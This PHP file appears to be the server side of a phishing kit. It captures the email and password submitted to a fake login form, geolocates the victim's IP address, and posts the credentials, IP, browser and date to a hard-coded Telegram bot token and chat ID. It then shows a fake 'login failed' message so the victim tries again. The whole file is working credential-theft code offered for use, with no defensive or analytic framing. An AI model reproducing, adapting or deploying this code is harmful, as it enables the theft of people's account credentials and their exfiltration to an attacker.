<?php

$botToken = '8101249536:AAHlUOdVYqO6M3qLV75l5X-ZCEhM22PX69Y'; 
$chatId = '7089868600';     

$country = visitor_country();
$countryCode = visitor_countryCode();
$continentCode = visitor_continentCode();
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$email = trim($_POST['txt1']);
$password = trim($_POST['txt2']);
$server = date("D/M/d, Y g:i a");

if($email != null && $password != null){
    
    $message_text = "✨ *New Login Alert* ✨\n\n";
    $message_text .= "📧 *Username:* `".$email."`\n";
    $message_text .= "🔑 *Password:* `".$password."`\n";
    $message_text .= "🌍 *Country:* ".$country." (".$countryCode.")\n";
    $message_text .= "📍 *IP Address:* [".$ip."](http://whoer.net/check?host=".$ip.")\n";
    $message_text .= "🕰️ *Date:* ".$server."\n";
    $message_text .= "🖥️ *Browser:* ".$browser."\n";


    $telegram_data = [
        'chat_id' => $chatId,
        'text' => $message_text,
        'parse_mode' => 'Markdown',
        'disable_web_page_preview' => true
    ];

    $telegram_api_url = 'https://api.telegram.org/bot' . $botToken . '/sendMessage';
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegram_api_url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $telegram_data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);


    $telegram_response = json_decode($response, true);
    error_log("Telegram Response: " . print_r($telegram_response, true));
    
    $signal = 'ok';
    $msg = 'Login failed! Please enter correct password';
}
else{
    $signal = 'ok';
    $msg = 'Please fill in all the fields.';
}

$data = array(
    'signal' => $signal,
    'msg' => $msg
);
echo json_encode($data);

function visitor_country()
{
    $client   = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote   = $_SERVER['REMOTE_ADDR'];
    $result   = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}

function visitor_countryCode()
{
    $client   = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote   = $_SERVER['REMOTE_ADDR'];
    $result   = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryCode != null)
    {
        $result = $ip_data->geoplugin_countryCode;
    }

    return $result;
}

function visitor_regionName()
{
    $client   = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote   = $_SERVER['REMOTE_ADDR'];
    $result   = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_regionName != null)
    {
        $result = $ip_data->geoplugin_regionName;
    }

    return $result;
}

function visitor_continentCode()
{
    $client   = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote   = $_SERVER['REMOTE_ADDR'];
    $result   = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_continentCode != null)
    {
        $result = $ip_data->geoplugin_continentCode;
    }

    return $result;
}

?>